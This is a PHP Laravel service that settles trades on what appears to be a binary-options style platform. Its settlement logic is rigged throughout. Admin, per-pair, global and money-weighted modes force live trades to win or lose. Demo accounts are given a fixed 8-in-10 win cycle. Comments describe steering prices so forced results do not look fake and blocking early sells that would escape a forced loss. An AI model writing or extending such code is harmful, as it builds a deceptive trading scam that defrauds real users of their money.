<?php

namespace App\Services;

use App\Models\Asset;
use App\Models\Trade;
use App\Models\TradeSimulationControl;
use App\Models\User;
use Illuminate\Support\Facades\DB;

/**
 * Trade Result Service
 *
 * Handles trade settlement with guaranteed admin override (win/loss),
 * pair-level directional control (pump/crash), and authentic pip margins.
 */
class TradeResultService
{
    private const FALLBACK_MAX_STORED_BALANCE = 9999999999000.00;
    private static array $balanceColumnMax = [];

    /**
     * Settle a trade and return [result, close_price, payout].
     *
     * @param Trade  $trade
     * @param float|null $clientClosePrice  Price sent from client chart
     * @return array ['result', 'close_price', 'payout', 'spike_injected']
     */
    public static function settle(Trade $trade, ?float $clientClosePrice = null): array
    {
        $result = DB::transaction(function () use ($trade) {
            $trade = Trade::with(['asset', 'user'])->whereKey($trade->id)->lockForUpdate()->firstOrFail();

            if ($trade->result !== 'pending') {
                return self::settledResponse($trade);
            }

            $user = User::whereKey($trade->user_id)->lockForUpdate()->first();
            $asset = $trade->asset;
            $override = $trade->admin_override ?? 'none';
            $openPrice = (float) $trade->open_price;

            app(GlobalPolicyEvaluator::class)->settlementPolicy($trade);

            $precision = OtcPriceEngine::getPrecision($openPrice);
            $pip = pow(10, -$precision);

            // 1. Check pair-level control mode (auto, pump, crash, force_win, force_loss)
            $pairMode = $asset->control_mode ?? 'auto';
            $winSide = $asset->win_side ?? 'none';
            $forcedSide = null;

            if ($pairMode === 'force_win' || $pairMode === 'win') {
                // Pair configured: all trades win
                $forcedSide = $trade->direction;
            } elseif ($pairMode === 'force_loss' || $pairMode === 'loss') {
                // Pair configured: all trades lose
                $forcedSide = $trade->direction === 'up' ? 'down' : 'up';
            } elseif ($pairMode === 'pump') {
                // Market pumped: UP trades win, DOWN trades lose
                $forcedSide = 'up';
            } elseif ($pairMode === 'crash') {
                // Market crashed: DOWN trades win, UP trades lose
                $forcedSide = 'down';
            } elseif ($winSide !== 'none') {
                [$upInv, $downInv, $upUsers, $downUsers] = self::getAssetTradeSides($asset->id, $trade->id);
                $forcedSide = OtcPriceEngine::determineWinningSide($winSide, $upInv, $downInv, $upUsers, $downUsers);
            }

            // 1b. Global Win/Loss mode also applies to trades that are
            // already running (it is only a fallback: pair control and
            // the per-trade override below both beat it).
            if ($forcedSide === null && $override === 'none') {
                $globalMode = TradeSimulationControl::currentMode();
                if ($globalMode === TradeSimulationControl::MODE_SIMULATION_WIN) {
                    $forcedSide = $trade->direction;
                } elseif ($globalMode === TradeSimulationControl::MODE_SIMULATION_LOSS) {
                    $forcedSide = $trade->direction === 'up' ? 'down' : 'up';
                }
            }

            // 2. Admin individual trade override preserves its existing highest priority over pair controls.
            if ($override === 'force_win') {
                $forcedSide = $trade->direction; // Trade must win
            } elseif ($override === 'force_loss') {
                $forcedSide = $trade->direction === 'up' ? 'down' : 'up'; // Trade must lose
            }

            // 3. Demo 8/2 cycle (demo trades only, and only when no
            // admin / pair / global control forced this trade).
            // In every 10 settled demo trades: 8 wins, 2 losses.
            // See DemoCycleService: the position survives forever
            // because it is counted from settled trades, never reset.
            if ($forcedSide === null && $trade->account_type === 'demo') {
                $settledDemoCount = DemoCycleService::settledDemoCount((int) $trade->user_id);
                $forcedSide = DemoCycleService::forcedSideForTrade($trade, $settledDemoCount);
            }

            [$closePrice, $spikeInjected] = self::calculateClosePrice($trade, $asset, $forcedSide, $openPrice, $precision, $pip);

            // 4. Determine result based on close price vs open price
            if ($trade->direction === 'up') {
                $settlementResult = $closePrice > $openPrice ? 'win' : ($closePrice < $openPrice ? 'loss' : 'tie');
            } else {
                $settlementResult = $closePrice < $openPrice ? 'win' : ($closePrice > $openPrice ? 'loss' : 'tie');
            }

            // 5. Compute actual balance effect
            $payout = self::actualPayoutFor($trade, $settlementResult);

            // 6. Update trade record
            $trade->update([
                'close_price' => $closePrice,
                'result' => $settlementResult,
                'closed_at' => now(),
                'spike_injected' => $spikeInjected,
            ]);

            // 7. Credit user balance exactly once inside the settlement transaction.
            if ($payout > 0 && $user) {
                self::creditUserBalance($user, $trade->account_type, $payout);
            }

            return [
                'result' => $settlementResult,
                'close_price' => $closePrice,
                'payout' => $payout,
                'spike_injected' => $spikeInjected,
                'balance' => $user ? $user->getBalance() : 0,
                'processed_referral' => in_array($settlementResult, ['win', 'loss'], true),
            ];
        });

        if ($result['processed_referral'] ?? false) {
            ReferralService::processTradeCommission($trade->fresh());
        }

        unset($result['processed_referral']);

        return $result;
    }

    public static function earlySell(Trade $trade, ?float $clientClosePrice = null): array
    {
        $result = DB::transaction(function () use ($trade, $clientClosePrice) {
            $trade = Trade::with(['asset', 'user'])->whereKey($trade->id)->lockForUpdate()->firstOrFail();

            if ($trade->result !== 'pending') {
                return self::settledResponse($trade);
            }

            if (self::isExpired($trade)) {
                return [
                    'success' => false,
                    'expired' => true,
                    'result' => 'pending',
                    'close_price' => (float) $trade->close_price,
                    'payout' => 0.0,
                    'spike_injected' => false,
                    'balance' => $trade->user ? $trade->user->getBalance() : 0,
                    'processed_referral' => false,
                ];
            }

            $user = User::whereKey($trade->user_id)->lockForUpdate()->first();

            // A forced Win/Loss also applies to an early Sell now:
            // otherwise the user could dodge a forced loss by
            // selling early, and the old code always returned 'win'
            // here because the buyout is positive in both cases
            // (15% when winning, 5% when losing), so
            // `$buyout > 0 ? 'win' : 'loss'` could never be 'loss'.
            $forcedSide = OtcPriceEngine::forcedSideForTrade($trade, $trade->asset);
            if ($forcedSide !== null) {
                $isWinning = $trade->direction === $forcedSide;
                $closePrice = OtcPriceEngine::steeringTargetPrice($trade, $forcedSide);
            } else {
                $closePrice = $clientClosePrice && $clientClosePrice > 0
                    ? round($clientClosePrice, OtcPriceEngine::getPrecision((float) $trade->open_price))
                    : OtcPriceEngine::simulatePrice($trade->asset);
                $isWinning = $trade->direction === 'up'
                    ? $closePrice > (float) $trade->open_price
                    : $closePrice < (float) $trade->open_price;
            }
            $buyout = max(0, round((float) $trade->investment * ($isWinning ? 0.15 : 0.05), 2));
            $result = $isWinning ? 'win' : 'loss';

            $trade->update([
                'close_price' => $closePrice,
                'result' => $result,
                'payout' => $buyout,
                'closed_at' => now(),
            ]);

            if ($buyout > 0 && $user) {
                self::creditUserBalance($user, $trade->account_type, $buyout);
            }

            return [
                'success' => true,
                'result' => $result,
                'close_price' => $closePrice,
                'payout' => $buyout,
                'spike_injected' => false,
                'balance' => $user ? $user->getBalance() : 0,
                'processed_referral' => true,
            ];
        });

        if ($result['processed_referral'] ?? false) {
            ReferralService::processTradeCommission($trade->fresh());
        }

        unset($result['processed_referral']);

        return $result;
    }

    public static function calculateEarlySellPayout(Trade $trade, ?float $currentPrice = null): float
    {
        $currentPrice ??= OtcPriceEngine::simulatePrice($trade->asset);
        $isWinning = $trade->direction === 'up'
            ? $currentPrice > (float) $trade->open_price
            : $currentPrice < (float) $trade->open_price;

        $rate = $isWinning ? 0.15 : 0.05;

        return max(0, round((float) $trade->investment * $rate, 2));
    }

    public static function settleDemoSimulation(Trade $trade, string $targetResult): array
    {
        return DB::transaction(function () use ($trade, $targetResult) {
            $trade = Trade::with(['asset', 'user'])->whereKey($trade->id)->lockForUpdate()->firstOrFail();

            if ($trade->account_type !== 'demo') {
                return [
                    'success' => false,
                    'status' => 403,
                    'error' => 'Simulation controls are allowed only for demo/test trades.',
                ];
            }

            if ($trade->result !== 'pending') {
                return self::settledResponse($trade) + [
                    'success' => false,
                    'status' => 409,
                    'error' => 'Trade is already settled.',
                ];
            }

            if (!in_array($targetResult, ['win', 'loss'], true)) {
                return [
                    'success' => false,
                    'status' => 422,
                    'error' => 'Invalid simulation result.',
                ];
            }

            $user = User::whereKey($trade->user_id)->lockForUpdate()->first();
            $asset = $trade->asset;
            $openPrice = (float) $trade->open_price;
            $precision = OtcPriceEngine::getPrecision($openPrice, $asset);
            $pip = pow(10, -$precision);
            $forcedSide = $targetResult === 'win'
                ? $trade->direction
                : ($trade->direction === 'up' ? 'down' : 'up');

            [$closePrice, $spikeInjected] = self::calculateClosePrice($trade, $asset, $forcedSide, $openPrice, $precision, $pip);
            $settlementResult = $targetResult;
            $payout = self::actualPayoutFor($trade, $settlementResult);

            $trade->update([
                'close_price' => $closePrice,
                'result' => $settlementResult,
                'closed_at' => now(),
                'spike_injected' => $spikeInjected,
                'admin_override' => $targetResult === 'win' ? 'force_win' : 'force_loss',
            ]);

            if ($payout > 0 && $user) {
                self::creditUserBalance($user, 'demo', $payout);
            }

            return [
                'success' => true,
                'result' => $settlementResult,
                'close_price' => $closePrice,
                'payout' => $payout,
                'spike_injected' => $spikeInjected,
                'balance' => $user ? $user->getBalance() : 0,
            ];
        });
    }

    /**
     * Get investment + user counts for each side on an asset.
     */
    private static function getAssetTradeSides(int $assetId, int $excludeTradeId): array
    {
        $up = Trade::where('asset_id', $assetId)
            ->where('result', 'pending')
            ->where('id', '!=', $excludeTradeId)
            ->where('direction', 'up')
            ->selectRaw('COUNT(*) as cnt, SUM(investment) as inv')
            ->first();

        $down = Trade::where('asset_id', $assetId)
            ->where('result', 'pending')
            ->where('id', '!=', $excludeTradeId)
            ->where('direction', 'down')
            ->selectRaw('COUNT(*) as cnt, SUM(investment) as inv')
            ->first();

        return [
            (float) ($up->inv   ?? 0),
            (float) ($down->inv ?? 0),
            (int)   ($up->cnt   ?? 0),
            (int)   ($down->cnt ?? 0),
        ];
    }

    private static function calculateClosePrice(Trade $trade, Asset $asset, ?string $forcedSide, float $openPrice, int $precision, float $pip): array
    {
        if ($forcedSide !== null) {
            // The live price already glided to this exact target in
            // the last 3 seconds, so settlement only confirms it.
            // No random 4-16 pip spike at expiry: that jump is what
            // made forced results look fake.
            return [OtcPriceEngine::steeringTargetPrice($trade, $forcedSide, $precision), false];
        }

        $closePrice = round(OtcPriceEngine::simulatePrice($asset), $precision);

        if ($closePrice === $openPrice) {
            $closePrice = round($openPrice + ((mt_rand(0, 1) ? 1 : -1) * $pip), $precision);
        }

        return [$closePrice, false];
    }

    private static function actualPayoutFor(Trade $trade, string $result): float
    {
        if ($result === 'win') {
            return (float) $trade->payout;
        }

        if ($result === 'tie') {
            return (float) $trade->investment;
        }

        return 0.0;
    }

    private static function creditUserBalance(User $user, string $accountType, float $amount): void
    {
        $column = $accountType === 'live' ? 'live_balance' : 'demo_balance';
        $nextBalance = round((float) $user->{$column} + $amount, 2);

        $user->{$column} = min($nextBalance, self::maxStoredBalance($column));
        $user->save();
    }

    private static function maxStoredBalance(string $column): float
    {
        if (isset(self::$balanceColumnMax[$column])) {
            return self::$balanceColumnMax[$column];
        }

        try {
            $meta = DB::table('information_schema.COLUMNS')
                ->whereRaw('TABLE_SCHEMA = DATABASE()')
                ->where('TABLE_NAME', 'users')
                ->where('COLUMN_NAME', $column)
                ->first(['NUMERIC_PRECISION', 'NUMERIC_SCALE']);

            $precision = (int) ($meta->NUMERIC_PRECISION ?? 15);
            $scale = (int) ($meta->NUMERIC_SCALE ?? 2);
            $integerDigits = max(1, $precision - $scale);

            if ($integerDigits <= 13) {
                return self::$balanceColumnMax[$column] = self::FALLBACK_MAX_STORED_BALANCE;
            }

            return self::$balanceColumnMax[$column] = 999999999999999.00;
        } catch (\Throwable) {
            return self::$balanceColumnMax[$column] = self::FALLBACK_MAX_STORED_BALANCE;
        }
    }

    private static function isExpired(Trade $trade): bool
    {
        $openedAt = $trade->opened_at ?: $trade->created_at;
        $duration = (int) ($trade->duration_seconds ?: 60);

        return $openedAt && now()->greaterThanOrEqualTo($openedAt->copy()->addSeconds($duration));
    }

    private static function settledResponse(Trade $trade): array
    {
        $trade->loadMissing('user');

        return [
            'result' => $trade->result,
            'close_price' => (float) $trade->close_price,
            'payout' => self::actualPayoutFor($trade, $trade->result),
            'spike_injected' => (bool) $trade->spike_injected,
            'balance' => $trade->user ? $trade->user->getBalance() : 0,
            'processed_referral' => false,
        ];
    }
}
